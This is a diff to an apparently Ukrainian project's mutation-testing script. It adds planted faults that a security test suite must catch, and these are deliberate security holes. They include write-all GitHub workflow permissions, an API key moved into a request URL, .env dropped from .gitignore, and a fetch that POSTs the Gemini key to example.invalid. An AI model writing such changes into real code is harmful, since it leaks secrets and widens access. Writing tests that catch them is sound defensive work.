@@ -1236,6 +1236,236 @@ const ПІДСАДКИ = [
     стереже: `таблиця: «Вчора» від показаної ціни`,
     сюїта: 'tests-front.mjs',
   },
+  {
+    імя: `збір знову з правами Pages на весь файл`,
+    файл: `../.github/workflows/collect.yml`,
+    було: `permissions: {}
+`,
+    стало: `permissions:
+  contents: write
+  pages: write
+  id-token: write
+`,
+    стереже: `collect.yml: згори прав немає`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `деплой без прав Pages`,
+    файл: `../.github/workflows/collect.yml`,
+    було: `    if: needs.collect.outputs.changed == 'true'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pages: write
+      id-token: write
+`,
+    стало: `    if: needs.collect.outputs.changed == 'true'
+    runs-on: ubuntu-latest
+`,
+    стереже: `collect.yml: pages/id-token — лише задачі deploy`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `ig-insights без явних прав`,
+    файл: `../.github/workflows/ig-insights.yml`,
+    було: `permissions:
+  contents: read
+
+`,
+    стало: ``,
+    стереже: `ig-insights.yml: явно лише читання`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `chat_id знову числом у публічному коді`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `Токен Instagram не продовжився`,
+    стало: `Токен Instagram не продовжився (chat_id=715480502)`,
+    стереже: `ig-refresh.yml: chat_id не вписаний числом`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `.env знову не в .gitignore`,
+    файл: `../.gitignore`,
+    було: `
+.env
+.env.*
+`,
+    стало: `
+`,
+    стереже: `.gitignore: .env і .env.* не потрапляють у репо`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `новини знову кожні 2 години`,
+    файл: `../.github/workflows/news.yml`,
+    було: `    - cron: '37 */3 * * *'`,
+    стало: `    - cron: '25 */2 * * *'`,
+    стереже: `news.yml: не частіше разу на 3 години`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `пост новин знову кожні 2 години`,
+    файл: `../.github/workflows/tg-post.yml`,
+    було: `    - cron: '47 */4 * * *'`,
+    стало: `    - cron: '15 */2 * * *'`,
+    стереже: `tg-post.yml: 6 запусків на добу (стеля 4 пости — у telegram-news.mjs)`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `ключ Gemini знову в адресі`,
+    файл: `reel-voice.mjs`,
+    було: `:generateContent\`,`,
+    стало: `:generateContent?key=\${key}\`,`,
+    стереже: `reel-voice: ключа немає в жодній адресі`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `ключ Gemini не в заголовку`,
+    файл: `reel-voice.mjs`,
+    було: `headers: { 'Content-Type': 'application/json', 'x-goog-api-key': key },`,
+    стало: `headers: { 'Content-Type': 'application/json' },`,
+    стереже: `reel-voice: ключ — у заголовку x-goog-api-key`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `workflow без явних прав`,
+    файл: `../.github/workflows/ig-news.yml`,
+    було: `permissions:
+  contents: write
+`,
+    стало: ``,
+    стереже: `усі workflow мають явний permissions`,
+    сюїта: 'tests-security.mjs',
+  },  {
+    імя: `write-all замість порожніх прав`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `permissions: {}
+`,
+    стало: `permissions: write-all
+`,
+    стереже: `ig-refresh.yml: явно без прав токена`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `reel-voice ходить не до Gemini`,
+    файл: `reel-voice.mjs`,
+    було: `\`https://generativelanguage.googleapis.com/v1beta/models/\${MODEL}:generateContent\``,
+    стало: `'https://example.invalid/tts'`,
+    стереже: `reel-voice: запит саме до Gemini TTS (адреса, метод, тіло)`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `розклад новин закоментовано`,
+    файл: `../.github/workflows/news.yml`,
+    було: `  schedule:
+    # кожні 3 години о :37 — непопулярна хвилина, GitHub менше запізнюється;
+    # раніше кожні 2 години (звіт health 28.09: news — найбільше запусків)
+    - cron: '37 */3 * * *'
+`,
+    стало: `  # schedule:
+  # # кожні 3 години о :37 — непопулярна хвилина, GitHub менше запізнюється;
+  # # раніше кожні 2 години (звіт health 28.09: news — найбільше запусків)
+  # - cron: '37 */3 * * *'
+`,
+    стереже: `news.yml: не частіше разу на 3 години`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `chat_id порожній`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `Токен Instagram не продовжився — потрібна ручна переавторизація (скажи Клоду «онови токен інстаграма»)."`,
+    стало: `Токен Instagram не продовжився — потрібна ручна переавторизація (скажи Клоду «онови токен інстаграма»)." -d chat_id=""`,
+    стереже: `ig-refresh.yml: кожен chat_id — це "$CHAT"`,
+    сюїта: 'tests-security.mjs',
+  },  {
+    імя: `ig-refresh: право в ключі в лапках`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `permissions: {}
+`,
+    стало: `permissions:
+  'contents': write
+`,
+    стереже: `ig-refresh.yml: явно без прав токена`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `reel-voice: зайвий запит із ключем до чужої адреси`,
+    файл: `reel-voice.mjs`,
+    було: `  const res = await fetch(
+`,
+    стало: `  await fetch('https://example.invalid/collect', { method: 'POST', body: key });
+  const res = await fetch(
+`,
+    стереже: `reel-voice: рівно один запит — і той пішов`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `ig-refresh: CHAT числом, vars лише в коментарі`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `          CHAT: \${{ vars.TG_OWNER_CHAT }}
+`,
+    стало: `          CHAT: '-1001234567890' # CHAT: \${{ vars.TG_OWNER_CHAT }}
+`,
+    стереже: `ig-refresh.yml: КОЖНЕ повідомлення йде саме на vars.TG_OWNER_CHAT`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `tg-post: діапазон годин замість кроку`,
+    файл: `../.github/workflows/tg-post.yml`,
+    було: `    - cron: '47 */4 * * *'`,
+    стало: `    - cron: '47 0-23/4,1-23 * * *'`,
+    стереже: `tg-post.yml: 6 запусків на добу (стеля 4 пости — у telegram-news.mjs)`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `ig-refresh: задача з write-all при порожніх правах згори`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `  refresh:
+    runs-on: ubuntu-latest
+`,
+    стало: `  refresh:
+    runs-on: ubuntu-latest
+    permissions: write-all
+`,
+    стереже: `ig-refresh.yml: задачі теж без прав`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `tg-post: частий cron з обмеженням днів`,
+    файл: `../.github/workflows/tg-post.yml`,
+    було: `    - cron: '47 */4 * * *'`,
+    стало: `    - cron: '*/5 * * * 0-6'`,
+    стереже: `tg-post.yml: 6 запусків на добу (стеля 4 пости — у telegram-news.mjs)`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `ig-refresh: CHAT обнулено в скрипті`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `          res=$(curl -s -G`,
+    стало: `          CHAT=''
+          res=$(curl -s -G`,
+    стереже: `ig-refresh.yml: КОЖНЕ повідомлення йде саме на vars.TG_OWNER_CHAT`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `ig-refresh: CHAT підмінено через read`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `          res=$(curl -s -G`,
+    стало: `          read -r CHAT <<< '-1001234567890'
+          res=$(curl -s -G`,
+    стереже: `ig-refresh.yml: КОЖНЕ повідомлення йде саме на vars.TG_OWNER_CHAT`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `ig-refresh: інший адресат у гілці успіху`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `          echo "Токен продовжено ще на $days днів."`,
+    стало: `          echo "Токен продовжено ще на $days днів."
+          curl -s -X POST "https://api.telegram.org/bot$TG/sendMessage" -d chat_id="123456" -d text=ok`,
+    стереже: `ig-refresh.yml: КОЖНЕ повідомлення йде саме на vars.TG_OWNER_CHAT`,
+    сюїта: 'tests-security.mjs',
+  },
 ];
 
 function прогін(корінь, сюїта = 'tests-parser.mjs') {
@@ -1255,6 +1485,9 @@ function накопії(робота) {
     // (tests-front.mjs) читають ../src. Шляхи підсадок — від scripts/.
     cpSync(SCRIPTS, path.join(корінь, 'scripts'), { recursive: true });
     cpSync(path.join(SCRIPTS, '..', 'src'), path.join(корінь, 'src'), { recursive: true });
+    // проби безпеки читають workflow і .gitignore — у копії вони теж мусять бути
+    cpSync(path.join(SCRIPTS, '..', '.github'), path.join(корінь, '.github'), { recursive: true });
+    cpSync(path.join(SCRIPTS, '..', '.gitignore'), path.join(корінь, '.gitignore'));
     return робота(корінь);
   } finally {
     rmSync(корінь, { recursive: true, force: true });
@@ -1269,7 +1502,7 @@ function накопії(робота) {
 // вони самі по собі справні. 20.09.2026 так і вийшло: tests-parser.mjs був
 // червоний ще до правки, і разом із ним мовчки випали всі інші.
 const хворі = new Set();
-for (const сюїта of ['tests-parser.mjs', 'tests-collect.mjs', 'tests-geo.mjs', 'tests-front.mjs']) {
+for (const сюїта of ['tests-parser.mjs', 'tests-collect.mjs', 'tests-geo.mjs', 'tests-front.mjs', 'tests-security.mjs']) {
   const базовий = накопії(к => прогін(к, сюїта));
   if (базовий.впало) {
     хворі.add(сюїта);
